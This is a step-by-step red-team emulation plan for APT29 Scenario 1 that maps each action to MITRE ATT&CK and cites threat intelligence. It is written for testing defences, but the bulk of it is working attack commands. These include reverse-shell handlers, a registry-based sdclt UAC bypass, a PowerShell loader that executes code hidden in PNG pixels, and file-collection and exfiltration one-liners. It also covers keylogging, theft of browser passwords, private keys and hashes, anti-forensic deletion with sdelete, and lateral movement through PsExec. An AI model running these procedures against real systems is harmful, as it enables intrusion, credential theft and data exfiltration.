# Preface

APT29 operations have been separated into two scenarios, with steps and granular procedures contained within each. Within each scenario, operations have been broken into specific objectives, which are presented linearly as each enables subsequent objectives. That said, each organization can tailor this emulation to their individual use case, priorities, and available resources.  The assessing team can begin at any scenario or objective but should do so understanding that each objective enables succeeding objectives.

---

# Scenario 1 Overview

* Emulation of APT29 usage of tools such as CosmicDuke, MiniDuke, SeaDuke/SeaDaddy, CozyDuke/CozyCar, and Hammertoss
* Scenario begins after delivery of a reverse shell payload via opportunistic, widespread phishing
* "Smash-and-grab" style collection and exfiltration before deciding the target may be of future value and deploying stealthier malware for long term exploitation
* Modular components (ex: PowerShell scripts) may be executed atomically

## Contents

* [Step 1 - Initial Breach](#step-1---initial-breach)
* [Step 2 - Rapid Collection and Exfiltration](#step-2---rapid-collection-and-exfiltration)
* [Step 3 - Deploy Stealth Toolkit](#step-3---deploy-stealth-toolkit)
* [Step 4 - Defense Evasion and Discovery](#step-4---defense-evasion-and-discovery)
* [Step 5 - Persistence](#step-5---persistence)
* [Step 6 - Credential Access](#step-6---credential-access)
* [Step 7 - Collection and Exfiltration](#step-7---collection-and-exfiltration)
* [Step 8 - Lateral Movement](#step-8---lateral-movement)
* [Step 9 - Collection](#step-9---collection)
* [Step 10 - Persistence Execution](#step-10---persistence-execution)
* [Acknowledgements](#acknowledgments)
* [Additional Plan Resources](#additional-plan-resources)

## Pre-requisites

Prior to beginning the following emulation Scenario, ensure you have the proper infrastructure requirements and configuration in place as stated in the [Scenario 1 Infrastructure](/apt29/Emulation_Plan/Scenario_1/Infrastructure.md) documentation.

---

## Step 1 - Initial Breach

The scenario begins with an initial breach, where a legitimate user clicks ([T1204](https://attack.mitre.org/versions/v6/techniques/T1204/) / [T1204.002](https://attack.mitre.org/techniques/T1204/002/)) an executable payload (screensaver executable) masquerading as a benign word document ([T1036](https://attack.mitre.org/versions/v6/techniques/T1036/) / [T1036.002](https://attack.mitre.org/techniques/T1036/)). Once executed, the payload creates a C2 connection over port 1234 ([T1065](https://attack.mitre.org/versions/v6/techniques/T1065/)) using the RC4 cryptographic cipher. The attacker then uses the active C2 connection to spawn interactive cmd.exe ([T1059](https://attack.mitre.org/versions/v6/techniques/T1059/) / [T1059.003](https://attack.mitre.org/techniques/T1059/003/)) and powershell.exe ([T1086](https://attack.mitre.org/versions/v6/techniques/T1086/) / [T1059.001](https://attack.mitre.org/techniques/T1059/001/)).

### Procedures

#### 1.A - User Execution: Malicious File ([T1204](https://attack.mitre.org/versions/v6/techniques/T1204/) / [T1204.002](https://attack.mitre.org/techniques/T1204/002/))

1. Login to victim workstation.
2. Double click `3aka3.doc` on Desktop

This will send a reverse shell to the Pupy C2 server.

#### 1.B - Command and Scripting Interpreter: PowerShell ([T1086](https://attack.mitre.org/versions/v6/techniques/T1086/) / [T1059.001](https://attack.mitre.org/techniques/T1059/001/))

From Pupy C2 server:

[pupy] > `shell`

[pupy (CMD)] > `powershell`

### Cited Intelligence

* Open Invitation Contributor: Kaspersky

* CosmicDuke’s infection payloads have started by tricking victims into opening a Windows executable whose filename is manipulated to look like an image file using the Right-to-Left Override (RLO) feature. CosmicDuke has also used RC4 to decrypt incoming data and encrypt outgoing data. <sup> [2](https://blog-assets.f-secure.com/wp-content/uploads/2019/10/15163405/CosmicDuke.pdf) </sup>

* SeaDuke and CozyDuke have used the RC4 cipher to encrypt data. <sup> [4](https://unit42.paloaltonetworks.com/unit-42-technical-analysis-seaduke/), [7](https://www.fireeye.com/blog/products-and-services/2019/02/state-of-the-hack-no-easy-breach-revisited.html), [13](https://www.symantec.com/connect/blogs/forkmeiamfamous-seaduke-latest-weapon-duke-armory), [15](https://securelist.com/the-cozyduke-apt/69731/) </sup>

* CozyDuke can be used to spawn a command line shell. <sup> [15](https://securelist.com/the-cozyduke-apt/69731/) </sup>

---

## Step 2 - Rapid Collection and Exfiltration

The attacker runs a one-liner command to search the filesystem for document and media files ([T1083](https://attack.mitre.org/techniques/T1083/), [T1119](https://attack.mitre.org/techniques/T1119/)), collecting ([T1005](https://attack.mitre.org/techniques/T1005/)) and compressing ([T1002](https://attack.mitre.org/versions/v6/techniques/T1002/) / [T1560.001](https://attack.mitre.org/techniques/T1560/001/)) content into a single file. The file is then exfiltrated over the existing C2 connection ([T1041](https://attack.mitre.org/techniques/T1041/)).

### Procedures

#### 2.A - Collection ([T1119](https://attack.mitre.org/techniques/T1119/), [T1005](https://attack.mitre.org/techniques/T1005/), [T1002](https://attack.mitre.org/versions/v6/techniques/T1002/) / [T1560.001](https://attack.mitre.org/techniques/T1560/001/))

Paste the following PowerShell 1-liner into the Pupy terminal:

[pupy (PowerShell)] >

```powershell
$env:APPDATA;$files=ChildItem -Path $env:USERPROFILE\ -Include *.doc,*.xps,*.xls,*.ppt,*.pps,*.wps,*.wpd,*.ods,*.odt,*.lwp,*.jtd,*.pdf,*.zip,*.rar,*.docx,*.url,*.xlsx,*.pptx,*.ppsx,*.pst,*.ost,*psw*,*pass*,*login*,*admin*,*sifr*,*sifer*,*vpn,*.jpg,*.txt,*.lnk -Recurse -ErrorAction SilentlyContinue | Select -ExpandProperty FullName; Compress-Archive -LiteralPath $files -CompressionLevel Optimal -DestinationPath $env:APPDATA\Draft.Zip -Force
```

[pupy (PowerShell)] > `exit`

[pupy (CMD)] > `exit`

#### 2.B - Exfiltration Over C2 Channel ([T1041](https://attack.mitre.org/techniques/T1041/))

[pupy] > `download "C:\Users\<username>\AppData\Roaming\Draft.Zip" .`

### Cited Intelligence

* Open Invitation Contributor: Kaspersky
* CosmicDuke’s information stealing functionality included stealing user files with file extensions that match a predefined list. <sup> [1](https://www.f-secure.com/documents/996508/1030745/dukes_whitepaper.pdf), [2](https://blog-assets.f-secure.com/wp-content/uploads/2019/10/15163405/CosmicDuke.pdf) </sup>

---

## Step 3 - Deploy Stealth Toolkit

The attacker now uploads a new payload ([T1105](https://attack.mitre.org/techniques/T1105/)) to the victim. The payload is a legitimately formed image file with a concealed PowerShell script ([T1027](https://attack.mitre.org/versions/v6/techniques/T1027/) / [T1027.003](https://attack.mitre.org/techniques/T1027/003/)). The attacker then elevates privileges via a user account control (UAC) bypass ([T1122](https://attack.mitre.org/versions/v6/techniques/T1122/) / [T1546.015](https://attack.mitre.org/techniques/T1546/015/), [T1088](https://attack.mitre.org/versions/v6/techniques/T1088/) / [T1548.002](https://attack.mitre.org/techniques/T1548/002/)), which executes the newly added payload. A new C2 connection is established over port 443 ([T1043](https://attack.mitre.org/versions/v6/techniques/T1043/) using the HTTPS protocol ([T1071](https://attack.mitre.org/versions/v6/techniques/T1071/) / [T1071.001](https://attack.mitre.org/techniques/T1071/001/), [T1032](https://attack.mitre.org/versions/v6/techniques/T1032/) / [T1573](https://attack.mitre.org/techniques/T1573/)). Finally, the attacker removes artifacts of the privilege escalation from the Registry ([T1112](https://attack.mitre.org/techniques/T1112/)).

### Procedures

#### 3.A - Ingress Tool Transfer ([T1105](https://attack.mitre.org/techniques/T1105/))

Start Metasploit handler:

[msf] > `handler -H 0.0.0.0 -P 443 -p windows/x64/meterpreter/reverse_https`

From Pupy, upload [monkey.png](/Resources/Scenario_1/monkey.png) to target:

[pupy] > `upload "/tmp/monkey.png" "C:\Users\<username>\Downloads\monkey.png"`
[pupy] > `shell`
[pupy CMD] > `powershell`

#### 3.B - Abuse Elevation Control Mechanism: Bypass User Access Control ([T1088](https://attack.mitre.org/versions/v6/techniques/T1088/) / [T1548.002](https://attack.mitre.org/techniques/T1548/002/))

[pupy (PowerShell)] >

```powershell
New-Item -Path HKCU:\Software\Classes -Name Folder -Force;
New-Item -Path HKCU:\Software\Classes\Folder -Name shell -Force;
New-Item -Path HKCU:\Software\Classes\Folder\shell -Name open -Force;
New-Item -Path HKCU:\Software\Classes\Folder\shell\open -Name command -Force;
Set-ItemProperty -Path "HKCU:\Software\Classes\Folder\shell\open\command" -Name "(Default)"
```

**Paste the following 1-liner when prompted for value:**

```powershell
powershell.exe -noni -noexit -ep bypass -window hidden -c "sal a New-Object;Add-Type -AssemblyName 'System.Drawing'; $g=a System.Drawing.Bitmap('C:\Users\username\Downloads\monkey.png');$o=a Byte[] 4480;for($i=0; $i -le 6; $i++){foreach($x in(0..639)){$p=$g.GetPixel($x,$i);$o[$i*640+$x]=([math]::Floor(($p.B-band15)*16)-bor($p.G-band15))}};$g.Dispose();IEX([System.Text.Encoding]::ASCII.GetString($o[0..3932]))"
```

[pupy (PowerShell)] >

```powershell
Set-ItemProperty -Path "HKCU:\Software\Classes\Folder\shell\open\command" -Name "DelegateExecute" -Force
```

**When prompted for value, press: [Enter]**

[pupy (PowerShell)] > `exit`
[pupy (CMD)] > `%windir%\system32\sdclt.exe`
[pupy CMD] > `powershell`

You should receive a high integrity Meterpreter callback.

#### 3.C - Modify Registry ([T1112](https://attack.mitre.org/techniques/T1112/))

[pupy (PowerShell)] > `Remove-Item -Path HKCU:\Software\Classes\Folder* -Recurse -Force`
[pupy (PowerShell)] > `exit`
[pupy (CMD)] > `exit`

### Cited Intelligence

* Open Invitation Contributors: Kaspersky, Microsoft

* CosmicDuke has occasionally embedded other malware components that are written to disk and executed.<sup> [1](https://www.f-secure.com/documents/996508/1030745/dukes_whitepaper.pdf) </sup>

* MiniDuke has transferred additional backdoors onto a system via GIF files.<sup> [3](https://securelist.com/the-miniduke-mystery-pdf-0-day-government-spy-assembler-0x29a-micro-backdoor/31112/) </sup>

* SeaDaddy/SeaDuke may support HTTPS/SSL network communications.<sup> [4](https://unit42.paloaltonetworks.com/unit-42-technical-analysis-seaduke/), [13](https://www.symantec.com/connect/blogs/forkmeiamfamous-seaduke-latest-weapon-duke-armory) </sup>

* APT29 has removed tools and forensic artifacts to hide activity, including the usage of Sdelete ([S0195](https://attack.mitre.org/software/S0195/)). APT29 has also bypassed UAC to elevate privileges.<sup> [5](https://www.slideshare.net/MatthewDunwoody1/no-easy-breach-derby-con-2016) </sup>

* HAMMERTOSS has embedded pictures with commands using steganography.<sup> [6](https://www.fireeye.com/blog/threat-research/2015/07/hammertoss_stealthy.html) </sup>

---

## Step 4 - Defense Evasion and Discovery

The attacker uploads additional tools ([T1105](https://attack.mitre.org/techniques/T1105/)) through the new, elevated access before spawning an interactive powershell.exe shell ([T1086](https://attack.mitre.org/versions/v6/techniques/T1086/) / [T1059.001](https://attack.mitre.org/techniques/T1059/001/)). The additional tools are decompressed ([T1140](https://attack.mitre.org/techniques/T1140/)) and positioned on the target for usage. The attacker then enumerates running processes ([T1057](https://attack.mitre.org/techniques/T1057/)) to discover/terminate the initial access from Step 1 before deleting various files ([T1107](https://attack.mitre.org/versions/v6/techniques/T1107/) / [T1070.004](https://attack.mitre.org/techniques/T1070/004/)) associated with that access. Finally, the attacker launches a PowerShell script that performs a wide variety of reconnaissance commands ([T1016](https://attack.mitre.org/techniques/T1016/), [T1033](https://attack.mitre.org/techniques/T1033/), [T1063](https://attack.mitre.org/versions/v6/techniques/T1063/) / [T1518.001](https://attack.mitre.org/techniques/T1518/001/), [T1069](https://attack.mitre.org/techniques/T1069/), [T1082](https://attack.mitre.org/techniques/T1082/), [T1083](https://attack.mitre.org/techniques/T1083/)), some of which are done by accessing the Windows API ([T1106](https://attack.mitre.org/techniques/T1106/)).

### Procedures

#### 4.A - Ingress Tool Transfer ([T1105](https://attack.mitre.org/techniques/T1105/))

From Metasploit:

[msf] > `sessions`
[msf] > `sessions -i 1`

[meterpreter\*] >

```powershell
upload SysinternalsSuite.zip "C:\\Users\\username\\Downloads\\SysinternalsSuite.zip"
```

[meterpreter\*] > `execute -f powershell.exe -i -H`

[meterpreter (PowerShell)\*] >

```powershell
Expand-Archive -LiteralPath "$env:USERPROFILE\Downloads\SysinternalsSuite.zip" -DestinationPath "$env:USERPROFILE\Downloads\"
```

[meterpreter (PowerShell)\*] >

```powershell
if (-Not (Test-Path -Path "C:\Program Files\SysinternalsSuite")) { Move-Item -Path $env:USERPROFILE\Downloads\SysinternalsSuite -Destination "C:\Program Files\SysinternalsSuite" }
```

[meterpreter (PowerShell)\*] > `cd "C:\Program Files\SysinternalsSuite\"`

#### 4.B - Indicator Removal on Host: File Deletion ([T1107](https://attack.mitre.org/versions/v6/techniques/T1107/) / [T1070.004](https://attack.mitre.org/techniques/T1070/004/))

Terminate Pupy RAT process:

[meterpreter (PowerShell)\*] > `Get-Process`

[meterpreter (PowerShell)\*] > `Stop-Process -Id <rcs.3aka3.doc PID> -Force`

You may now close Pupy.

From Metasploit:

[meterpreter (PowerShell)\*] > `Gci $env:userprofile\Desktop`

[meterpreter (PowerShell)\*] > `.\sdelete64.exe /accepteula "$env:USERPROFILE\Desktop\?rcs.3aka.doc"`

[meterpreter (PowerShell)\*] > `.\sdelete64.exe /accepteula "$env:APPDATA\Draft.Zip"`

[meterpreter (PowerShell)\*] > `.\sdelete64.exe /accepteula "$env:USERPROFILE\Downloads\SysinternalsSuite.zip"`

Import custom script, readme.ps1:

[meterpreter (PowerShell)\*] > `Move-Item .\readme.txt readme.ps1`

[meterpreter (PowerShell)\*] > `. .\readme.ps1`

#### 4.C - Discovery ([T1016](https://attack.mitre.org/techniques/T1016/), [T1033](https://attack.mitre.org/techniques/T1033/), [T1063](https://attack.mitre.org/versions/v6/techniques/T1063/) / [T1518.001](https://attack.mitre.org/techniques/T1518/001/), [T1069](https://attack.mitre.org/techniques/T1069/), [T1082](https://attack.mitre.org/techniques/T1082/), [T1083](https://attack.mitre.org/techniques/T1083/))

[meterpreter (PowerShell)\*] > `Invoke-Discovery`

### Cited Intelligence

* Open Invitation Contributors: Kaspersky, Microsoft, SentinelOne

* CozyDuke has been instructed to download and execute other executables, which in some cases included common hacking tools such as PSExec ([S0029](https://attack.mitre.org/software/S0029/)). <sup>[1](https://www.f-secure.com/documents/996508/1030745/dukes_whitepaper.pdf) </sup>

* MiniDuke can download and execute new malware and lateral movement tools.<sup> [3](https://securelist.com/the-miniduke-mystery-pdf-0-day-government-spy-assembler-0x29a-micro-backdoor/31112/) </sup>

* APT29 has removed tools and forensic artifacts to hide activity.<sup> [5](https://www.slideshare.net/MatthewDunwoody1/no-easy-breach-derby-con-2016),[7](https://www.fireeye.com/blog/products-and-services/2019/02/state-of-the-hack-no-easy-breach-revisited.html),[13](https://www.symantec.com/connect/blogs/forkmeiamfamous-seaduke-latest-weapon-duke-armory) </sup>

* CozyDuke can be used to spawn a command line shell.<sup> [15](https://securelist.com/the-cozyduke-apt/69731/) </sup>

---

## Step 5 - Persistence

The attacker establishes two distinct means of persistent access to the victim by creating a new service ([T1031](https://attack.mitre.org/versions/v6/techniques/T1031/) / [T1543.003](https://attack.mitre.org/techniques/T1543/003/)) and creating a malicious payload in the Windows Startup folder ([T1060](https://attack.mitre.org/versions/v6/techniques/T1060/) / [T1547.001](https://attack.mitre.org/techniques/T1547/001/)).

### Procedures

#### 5.A - Create or Modify System Process: Windows Service ([T1031](https://attack.mitre.org/versions/v6/techniques/T1031/) / [T1543.003](https://attack.mitre.org/techniques/T1543/003/))

[meterpreter (PowerShell)\*] > `Invoke-Persistence -PersistStep 1`

#### 5.B - Boot or Logon Autostart Execution: Registry Run Keys / Startup Folder ([T1060](https://attack.mitre.org/versions/v6/techniques/T1060/) / [T1547.001](https://attack.mitre.org/techniques/T1547/001/))

[meterpreter (PowerShell)\*] > `Invoke-Persistence -PersistStep 2`

### Cited Intelligence

* Open Invitation Contributor: Kaspersky

* CosmicDuke has installed a Windows service to achieve persistence on a system.<sup> [2](https://blog-assets.f-secure.com/wp-content/uploads/2019/10/15163405/CosmicDuke.pdf) </sup>

* SeaDuke has the ability to persist using a .lnk file stored in the Startup directory.<sup> [4](https://unit42.paloaltonetworks.com/unit-42-technical-analysis-seaduke/) </sup>

* APT29 has used several persistence mechanisms, including .LNK files.<sup> [5](https://www.slideshare.net/MatthewDunwoody1/no-easy-breach-derby-con-2016) </sup>

---

## Step 6 - Credential Access

The attacker accesses credentials stored in a local web browser ([T1081](https://attack.mitre.org/versions/v6/techniques/T1081/) / [T1552.001](https://attack.mitre.org/techniques/T1552/001/), [T1003](https://attack.mitre.org/versions/v6/techniques/T1003/) / [T1555.003](https://attack.mitre.org/techniques/T1555/003/)) using a tool renamed to masquerade as a legitimate utility ([T1036](https://attack.mitre.org/versions/v6/techniques/T1036/) / [T1036.005](https://attack.mitre.org/techniques/T1036/005)). The attacker then harvests private keys ([T1145](https://attack.mitre.org/versions/v6/techniques/T1145/) / [T1552.004](https://attack.mitre.org/techniques/T1552/004/)) and password hashes ([T1003](https://attack.mitre.org/versions/v6/techniques/T1003/) / [T1003.002](https://attack.mitre.org/techniques/T1003/002/)).

### Procedures

#### 6.A - Credentials from Password Stores: Credentials from Web Browsers ([T1003](https://attack.mitre.org/versions/v6/techniques/T1003/) / [T1555.003](https://attack.mitre.org/techniques/T1555/003/))

Execute chrome-password collector:

[meterpreter (PowerShell)\*] > `& "C:\Program Files\SysinternalsSuite\accesschk.exe"`

#### 6.B - Unsecured Credentials: Private Keys ([T1145](https://attack.mitre.org/versions/v6/techniques/T1145/) / [T1552.004](https://attack.mitre.org/techniques/T1552/004/))

Steal PFX certificate:

[meterpreter (PowerShell)\*] > `Get-PrivateKeys`

[meterpreter (PowerShell)\*] > `exit`

#### 6.C - OS Credential Dumping: Security Account Manager ([T1003](https://attack.mitre.org/versions/v6/techniques/T1003/) / [T1003.002](https://attack.mitre.org/techniques/T1003/002/))

Dump password hashes:

[meterpreter\*] > `run post/windows/gather/credentials/credential_collector`

### Cited Intelligence

* Open Invitation Contributors: Kaspersky, SentinelOne

* CosmicDuke’s information stealing functionality has included exporting user’s cryptographic certificates, including private keys, and collecting user credentials, including passwords from web browsers (ex: Google Chrome). CozyDuke has contained modules that can steal NTLM hashes as well as capture screenshots. <sup> [1](https://www.f-secure.com/documents/996508/1030745/dukes_whitepaper.pdf), [2](https://blog-assets.f-secure.com/wp-content/uploads/2019/10/15163405/CosmicDuke.pdf) </sup>

---

## Step 7 - Collection and Exfiltration

The attacker collects screenshots ([T1113](https://attack.mitre.org/techniques/T1113/)), data from the user’s clipboard ([T1115](https://attack.mitre.org/techniques/T1115/)), and keystrokes ([T1056](https://attack.mitre.org/versions/v6/techniques/T1056/) / [T1056.001](https://attack.mitre.org/techniques/T1056/001/)). The attacker then collects files ([T1005](https://attack.mitre.org/techniques/T1005/)), which are compressed and encrypted ([T1560](https://attack.mitre.org/versions/v6/techniques/T1560/) / [T1560.001](https://attack.mitre.org/techniques/T1560/001/)), before being exfiltrated to an attacker-controlled WebDAV share ([T1048](https://attack.mitre.org/versions/v6/techniques/T1048/) / [T1048](https://attack.mitre.org/techniques/T1048/003)).

### Procedures

#### 7.A - User Monitoring ([T1113](https://attack.mitre.org/techniques/T1113/), [T1115](https://attack.mitre.org/techniques/T1115/), [T1056](https://attack.mitre.org/versions/v6/techniques/T1056/) / [T1056.001](https://attack.mitre.org/techniques/T1056/001/))

[meterpreter\*] > `execute -f powershell.exe -i -H`

[meterpreter (PowerShell)\*] > `cd "C:\Program Files\SysinternalsSuite"`

[meterpreter (PowerShell)\*] > `Move-Item .\psversion.txt psversion.ps1`

[meterpreter (PowerShell)\*] > `. .\psversion.ps1`

[meterpreter (PowerShell)\*] > `Invoke-ScreenCapture;Start-Sleep -Seconds 3;View-Job -JobName "Screenshot"`

From the Windows victim, type text and copy to the clipboard.

[meterpreter (PowerShell)\*] > `Get-Clipboard`

[meterpreter (PowerShell)\*] > `Keystroke-Check`

[meterpreter (PowerShell)\*] > `Get-Keystrokes;Start-Sleep -Seconds 15;View-Job -JobName "Keystrokes"`

From victim system, enter keystrokes.

View keylog output from Metasploit:

[meterpreter (PowerShell)\*] > `View-Job -JobName "Keystrokes"`
[meterpreter (PowerShell)\*] > `Remove-Job -Name "Keystrokes" -Force`
[meterpreter (PowerShell)\*] > `Remove-Job -Name "Screenshot" -Force`

#### 7.B - Compression and Exfiltration ([T1048](https://attack.mitre.org/techniques/T1048/), [T1002](https://attack.mitre.org/versions/v6/techniques/T1002/), [T1022](https://attack.mitre.org/versions/v6/techniques/T1022/) / [T1560.001](https://attack.mitre.org/techniques/T1560/001/))

[meterpreter (PowerShell)\*] > `Invoke-Exfil`

### Cited Intelligence

* Open Invitation Contributor: Kaspersky

* CosmicDuke’s information stealing functionality has included keylogging, taking screenshots, and stealing clipboard contents. Collected data can be exfiltrated using WebDAV. <sup> [1](https://www.f-secure.com/documents/996508/1030745/dukes_whitepaper.pdf), [2](https://blog-assets.f-secure.com/wp-content/uploads/2019/10/15163405/CosmicDuke.pdf) </sup>

* CozyDuke can be used to take screenshots of a full desktop window and encrypt collected data.<sup> [15](https://securelist.com/the-cozyduke-apt/69731/) </sup>

---

## Step 8 - Lateral Movement

The attacker uses Lightweight Directory Access Protocol (LDAP) queries to enumerate other hosts in the domain ([T1018](https://attack.mitre.org/techniques/T1018/)) before creating a remote PowerShell session to a secondary victim ([T1021](https://attack.mitre.org/versions/v6/techniques/T1021/) / [T1021.006](https://attack.mitre.org/techniques/T1021/006/)). Through this connection, the attacker enumerates running processes ([T1057](https://attack.mitre.org/techniques/T1057/)). Next, the attacker uploads ([T1105](https://attack.mitre.org/techniques/T1105/)) a new UPX-packed payload ([T1027](https://attack.mitre.org/versions/v6/techniques/T1027/) / [T1027.002](https://attack.mitre.org/techniques/T1027/002/)) to the secondary victim. This new payload is executed on the secondary victim via the PSExec utility ([T1021](https://attack.mitre.org/versions/v6/techniques/T1021/) / [T1021.002](https://attack.mitre.org/techniques/T1021/002/), [T1035](https://attack.mitre.org/versions/v6/techniques/T1035/) / [T1569.002](https://attack.mitre.org/techniques/T1569/002/)) using the previously stolen credentials ([T1078](https://attack.mitre.org/versions/v6/techniques/T1078/) / [T1078.002](https://attack.mitre.org/techniques/T1078/002)).

### Procedures

#### 8.A - Remote Services: Windows Remote Management ([T1021](https://attack.mitre.org/versions/v6/techniques/T1021/) / [T1021.006](https://attack.mitre.org/techniques/T1021/006/))

Copy payload to webdav share:

[user@attacker]\# `cp attack-evals/apt29/day1/payloads/python.exe /var/www/webdav/`
[user@attacker]\# `cd /var/www/webdav`
[user@attacker]\# `chown -R www-data:www-data python.exe`

Switch back to Meterpreter shell:

[meterpreter (PowerShell)\*] > `Ad-Search Computer Name *`

[meterpreter (PowerShell)\*] >

```powershell
Invoke-Command -ComputerName <victim 2 IP> -ScriptBlock { Get-Process -IncludeUserName | Select-Object UserName,SessionId | Where-Object { $_.UserName -like "*\$env:USERNAME" } | Sort-Object SessionId -Unique } | Select-Object UserName,SessionId
```

Note the session ID for step 8C.

#### 8.B - Ingress Tool Transfer ([T1105](https://attack.mitre.org/techniques/T1105/))

Start a new instance of Metasploit, and spawn a Metasploit handler:

[bash] > `msfconsole`

[msf] > `handler -H 0.0.0.0 -P 8443 -p python/meterpreter/reverse_https`

Return to current Meterpreter session:

[meterpreter (PowerShell)\*] > `Invoke-SeaDukeStage -ComputerName <victim 2 IP>`

#### 8.C - System Services: Service Execution ([T1035](https://attack.mitre.org/versions/v6/techniques/T1035/) / [T1569.002](https://attack.mitre.org/techniques/T1569/002/))

**Execute SEADUKE Remotely via PSEXEC**

[meterpreter (PowerShell)\*] >

```powershell
.\PsExec64.exe -accepteula \\<victim 2 IP> -u "domainName\username" -p P@ssw0rd -i <session ID from 8A> "C:\Windows\Temp\python.exe"
```

You should receive a callback in your other Metasploit terminal.

### Cited Intelligence

* Open Invitation Contributors: Microsoft, SentinelOne

* SeaDuke has been written in Python and has been delivered through the CozyDuke toolkit.<sup>[1](https://www.f-secure.com/documents/996508/1030745/dukes_whitepaper.pdf),[13](https://www.symantec.com/connect/blogs/forkmeiamfamous-seaduke-latest-weapon-duke-armory) </sup>

* SeaDuke/SeaDaddy samples have been UPX-packed.<sup>[4](https://unit42.paloaltonetworks.com/unit-42-technical-analysis-seaduke/),[5](https://www.slideshare.net/MatthewDunwoody1/no-easy-breach-derby-con-2016),[12](https://www.crowdstrike.com/blog/bears-midst-intrusion-democratic-national-committee/) </sup>

* APT29 has UPX-packed and used SMB to transfer files.<sup> [5](https://www.slideshare.net/MatthewDunwoody1/no-easy-breach-derby-con-2016)</sup>

* APT29 has used UPX-packed, Python-compiled backdoors.<sup> [7](https://www.fireeye.com/blog/products-and-services/2019/02/state-of-the-hack-no-easy-breach-revisited.html)</sup>

---

## Step 9 - Collection

The attacker uploads additional utilities to the secondary victim ([T1105](https://attack.mitre.org/techniques/T1105/)) before running a PowerShell one-liner command ([T1059](https://attack.mitre.org/versions/v6/techniques/T1059/) / [T1059.001](https://attack.mitre.org/techniques/T1059/001/)) to search for filesystem for document and media files ([T1083](https://attack.mitre.org/techniques/T1083/), [T1119](https://attack.mitre.org/techniques/T1119/)). Files of interested are collected ([T1005](https://attack.mitre.org/techniques/T1005/)) then encrypted and compressed ([T1002](https://attack.mitre.org/versions/v6/techniques/T1002/), [T1022](https://attack.mitre.org/versions/v6/techniques/T1022/) / [T1560.001](https://attack.mitre.org/techniques/T1560/001/) into a single file ([T1074](https://attack.mitre.org/versions/v6/techniques/T1074/) / [T1074.001](https://attack.mitre.org/techniques/T1074/001/)). The file this then exfiltrated over the existing C2 connection ([T1041](https://attack.mitre.org/techniques/T1041/)). Finally, the attacker deletes various files ([T1107](https://attack.mitre.org/versions/v6/techniques/T1107/) / [T1070.004](https://attack.mitre.org/techniques/T1070/004/)) associated with that access.

### Procedures

#### 9.A - Ingress Tool Transfer ([T1105](https://attack.mitre.org/techniques/T1105/))

From the second Metasploit terminal:

[msf] > `sessions`
[msf] > `sessions -i 1`

[meterpreter\*] >

```cmd
upload "/home/gfawkes/Round2/Day1/payloads/r2d1/Seaduke/rar.exe" "C:\\Windows\\Temp\\Rar.exe"
```

[meterpreter\*] >

```cmd
upload "sdelete64.exe" "C:\\Windows\\Temp\\sdelete64.exe"
```

#### 9.B - Collection and Exfiltration ([T1005](https://attack.mitre.org/techniques/T1005/), [T1041](https://attack.mitre.org/techniques/T1041/), [T1002](https://attack.mitre.org/versions/v6/techniques/T1002/),  [T1022](https://attack.mitre.org/versions/v6/techniques/T1022/) / [T1560.001](https://attack.mitre.org/techniques/T1560/001/))

[meterpreter\*] > `execute -f powershell.exe -i -H`

[meterpreter (PowerShell)\*] >

```powershell
$env:APPDATA;$files=ChildItem -Path $env:USERPROFILE\ -Include *.doc,*.xps,*.xls,*.ppt,*.pps,*.wps,*.wpd,*.ods,*.odt,*.lwp,*.jtd,*.pdf,*.zip,*.rar,*.docx,*.url,*.xlsx,*.pptx,*.ppsx,*.pst,*.ost,*psw*,*pass*,*login*,*admin*,*sifr*,*sifer*,*vpn,*.jpg,*.txt,*.lnk -Recurse -ErrorAction SilentlyContinue | Select -ExpandProperty FullName; Compress-Archive -LiteralPath $files -CompressionLevel Optimal -DestinationPath $env:APPDATA\working.zip -Force
```

[meterpreter (PowerShell)\*] > `cd C:\Windows\Temp`

[meterpreter (PowerShell)\*] > `.\Rar.exe a -hpfGzq5yKw "$env:USERPROFILE\Desktop\working.zip" "$env:APPDATA\working.zip"`

[meterpreter (PowerShell)\*] > `exit`

[meterpreter\*] > `download "C:\\Users\\<username>\\Desktop\\working.zip" .`

#### 9.C - Indicator Removal on Host: File Deletion ([T1107](https://attack.mitre.org/versions/v6/techniques/T1107/) / [T1070.004](https://attack.mitre.org/techniques/T1070/004/))

[meterpreter\*] > `shell`

[meterpreter (Shell)\*] > `cd "C:\Windows\Temp"`

[meterpreter (Shell)\*] > `.\sdelete64.exe /accepteula "C:\Windows\Temp\Rar.exe"`

[meterpreter (Shell)\*] > `.\sdelete64.exe /accepteula "C:\Users\<username>\AppData\Roaming\working.zip"`

[meterpreter (Shell)\*] > `.\sdelete64.exe /accepteula "C:\Users\<username>\Desktop\working.zip"`

[meterpreter (Shell)\*] > `del "C:\Windows\Temp\sdelete64.exe"`

**Terminate Session**

[meterpreter (Shell)\*] > `exit`
[meterpreter\*] > `exit`
msf> `exit`

### Cited Intelligence

* Open Invitation Contributors: Kaspersky, Microsoft, SentinelOne

* CosmicDuke’s information stealing functionality has included stealing user files with file extensions that match a predefined list and exfiltrating collected data via HTTPS. SeaDuke can execute command such as uploading and
downloading files. <sup> [1](https://www.f-secure.com/documents/996508/1030745/dukes_whitepaper.pdf), [2](https://blog-assets.f-secure.com/wp-content/uploads/2019/10/15163405/CosmicDuke.pdf) </sup>

* MiniDuke can download and execute new malware and lateral movement tools.<sup> [3](https://securelist.com/the-miniduke-mystery-pdf-0-day-government-spy-assembler-0x29a-micro-backdoor/31112/) </sup>

* SeaDuke has contained commands to download and Base-64-encode files.<sup> [4](https://unit42.paloaltonetworks.com/unit-42-technical-analysis-seaduke/) </sup>

* APT29 has removed tools and forensic artifacts to hide activity, including the usage of Sdelete ([S0195](https://attack.mitre.org/software/S0195/)). <sup> [5](https://www.slideshare.net/MatthewDunwoody1/no-easy-breach-derby-con-2016), [7](https://www.fireeye.com/blog/products-and-services/2019/02/state-of-the-hack-no-easy-breach-revisited.html), [13](https://www.symantec.com/connect/blogs/forkmeiamfamous-seaduke-latest-weapon-duke-armory) </sup>

* SeaDaddy has used RAR to archive collected data.<sup> [7](https://www.fireeye.com/blog/products-and-services/2019/02/state-of-the-hack-no-easy-breach-revisited.html) </sup>

* CozyDuke can be used to take screenshots of a full desktop window and encrypt collected data.<sup> [15](https://securelist.com/the-cozyduke-apt/69731/) </sup>

---

## Step 10 - Persistence Execution

